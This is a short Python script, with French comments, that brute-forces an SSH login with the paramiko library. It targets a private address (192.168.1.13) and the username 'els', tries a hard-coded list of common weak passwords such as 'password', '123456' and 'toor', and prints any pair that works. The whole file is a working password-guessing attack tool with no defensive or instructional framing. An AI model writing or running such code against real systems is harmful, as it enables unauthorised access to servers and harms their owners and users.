import paramiko
import time

def ssh_bruteforce(ip, port, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(ip, port, username, password, timeout=3)
            print(f'Success! Username: {username}, Password: {password}')
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(f'Failed: {password}')
            time.sleep(1)  # Attendre 1 seconde entre les tentatives
        except Exception as e:
            print(f'Error: {e}')
            time.sleep(1)

    return False

if __name__ == '__main__':
    target_ip = '192.168.1.13'  # Adresse IP cible
    target_port = 22  # Port SSH
    target_username = 'els'  # Nom d'utilisateur SSH

    # Liste de mots de passe à tester
    password_list = [
        'password',
        '123456',
        'admin',
        'root',
        'toor',
        'letmein'
    ]

    success = ssh_bruteforce(target_ip, target_port, target_username, password_list)
    if not success:
        print('Bruteforce attack failed.')
